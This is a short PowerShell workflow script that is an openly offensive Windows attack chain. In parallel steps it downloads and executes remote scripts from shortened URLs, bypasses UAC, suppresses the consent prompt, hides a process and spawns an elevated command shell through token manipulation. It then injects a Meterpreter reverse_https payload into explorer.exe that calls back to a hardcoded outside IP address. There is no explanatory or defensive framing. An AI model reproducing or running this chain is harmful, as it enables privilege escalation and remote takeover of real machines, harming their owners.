workflow Test-Workflow
{
    Parallel
    {
        iwr https://goo.gl/x6ZcHM | iex; Bypass-UAC -Method UacMethodNetOle32
        iwr https://goo.gl/zggqse | iex; kill-window consent #sendKey kill to consent
        iwr https://goo.gl/zggqse | iex; hide-process mmc #hide mmc
        iwr https://goo.gl/wxJHHq | iex; UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -ProcPID (ps -Name mmc).id # PROMPT ADMIN CMD AHAHAH :D #-Args "/c powershell -C iwr goo.gl/ | iex"-ProcPID (ps -Name mmc).id
        iwr https://goo.gl/UJL3nD | iex; Invoke-Shellcode -ProcessId $((ps -Name explorer.exe).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443
    }
}
